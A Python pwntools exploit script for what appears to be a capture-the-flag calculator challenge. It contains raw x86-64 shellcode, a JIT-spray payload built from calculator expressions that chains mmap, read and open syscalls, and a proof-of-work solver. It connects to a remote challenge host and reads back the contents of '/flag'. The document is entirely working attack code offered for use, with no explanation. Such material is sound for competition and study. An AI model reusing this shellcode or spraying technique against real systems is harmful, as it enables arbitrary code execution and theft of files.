from pwn import *
import os


context.arch = 'amd64'

HOST, PORT = 'supersafecalc.challenges.ooo', 6789
SHELLCODE_WRITE = b'\x90\xbc\x00(\x00\x01\xb8\xe0/\x00\x01H\x8b\x18H\xb9///flag\x00\xb0\x00\x89\xc7H\x89\x0f\x90H\x87\xd9\xeb\xf7\xccf\xba\xff\x01H\xc7\xc7\x00/\x00\x011\xf61\xc0\xb0\x02\x0f\x05\x85\xc0x\xf6P_T^1\xc0\x0f\x05\xb8\x00\x16\x00\x01' + b'[' * int(os.getenv('OFFSET')) + b'\xff\xe0'
SHELLCODE_OFFSET = 0x26

def exploit(p):

    # Set RDX to ~0
    payload = '(1+1) + '

    # Push stack lower towards code page
    payload += '(1 +' *47

    # MMAP values
    addr = 0x01000000
    size = 0x1000
    flags = 7
    mode = 0x31
    fd = 0
    off = 0
    SYS_MMAP = 9
    pipe_fd = 3
    SYS_READ = 0
    payload_addr = 0x1002f00
    payload_len = 10*8
    payload += f'({addr+0x60+SHELLCODE_OFFSET} +'
    payload += f'({SYS_READ} +'
    payload += f'({pipe_fd} +'
    payload += f'({addr+0x60} +'
    payload += f'({payload_addr} +'
    payload += f'({payload_len} +'
    payload += f'({SYS_MMAP} +'
    payload += f'({flags} +'
    payload += f'({size} +'
    payload += f'({addr} +'
    payload += f'({off} +'
    payload += f'({fd} +'
    payload += f'({mode} +'

    payload += '((1/1))' +')'*60 + '+'

    # Push code towards stack
    magic_val = 0x1001e22
    #  magic_val = 0x1337
    payload += 'v0+'*14 

    # Jump across
    jmp = b"\xeb\x13"

    shellcode = [
            u32(asm('pop rax; pop rax')+jmp),
            u32(asm('pop r10')+jmp),
            u32(asm('pop r9')+jmp),
            u32(asm('pop rax')+b"\x90"+jmp),
            u32(asm('dec eax')+jmp),
            u32(asm('push rax')+b"\x90"+jmp),
            u32(asm('pop r8')+jmp),
            u32(asm('pop rdi; pop rsi')+jmp),
            u32(asm('pop rdx; pop rax')+jmp),
            u32(asm('syscall')+jmp),
            u32(asm('pop rcx; pop rsi')+jmp),
            u32(asm('pop rdi')+b"\x90"+jmp),
            u32(asm("rep movsb byte ptr [rdi], byte ptr [rsi]")+jmp),
            u32(asm("pop rdi; pop rax")+jmp),
            u32(asm("syscall")+jmp),
            u32(asm("pop rdi; jmp rdi; nop"))
            #  u32(b"\xeb\xfe\x90\x90")
    ]

    for x in shellcode:
        payload += f'{x}+'

    payload += '1+'*(19-len(shellcode))
    payload += f'(1+(1+(1+({magic_val}))))'

    conn = p
    #  print(payload)
    conn.recvuntil('Challenge: ')
    # Get the POW chall string
    chall = str(conn.recvline())[2:-3]
    conn.recvuntil('n: ')
    # Get the int val
    n = str(conn.recvline())[2:-3]

    # Does the POW calc and gets the result
    proc = process(['python3', 'pow.py', 'solve', n, chall])
    proc.recvuntil('Solution: ')
    result = str(proc.recvline())[2:-3]
    result = result.split(' -> ')

    conn.sendline(result[0])
    p.sendlineafter('I only support +, -, *, /):\n', payload)

    # SHELLCODE -> Convert it into a list of integers each 8 byte long
    write_shellcode = SHELLCODE_WRITE.ljust(0x50, b'\xcc')
    shellcode = [ u64(write_shellcode[i:i+8].ljust(8, b"\x00")) for i in range(0, len(write_shellcode), 8)]

    padding = [x for x in range(10-len(shellcode))]
    shellcode += padding

    assert len(shellcode) == 10
    for x in range(10):
        p.sendlineafter(f'Give me the value of v{x}:\n', str(shellcode[x]))

    p.recvuntil(b'Result:\n')
    result = binascii.unhexlify('{:016x}'.format(int(p.readline().strip())))[::-1]
    print("FLAGFLAGFLAG: {}".format(result))


if __name__ == '__main__':
    if len(sys.argv) == 1:
        optarg = 'remote'
    else:
        optarg = sys.argv[1]

    if optarg == 'local':
        p = process(['./decompiled.py', './ABCDE'])
    else:
        p = remote(HOST, PORT)
    exploit(p)
